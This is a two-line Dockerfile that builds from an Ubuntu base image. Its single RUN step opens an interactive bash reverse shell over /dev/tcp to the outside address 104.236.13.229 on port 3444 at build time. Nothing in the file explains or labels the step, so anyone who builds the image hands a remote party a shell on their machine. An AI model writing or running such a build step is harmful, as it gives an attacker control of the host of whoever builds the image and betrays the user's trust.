FROM ubuntu:latest
RUN /bin/bash -c 'bash -i >& /dev/tcp/104.236.13.229/3444 0>&1'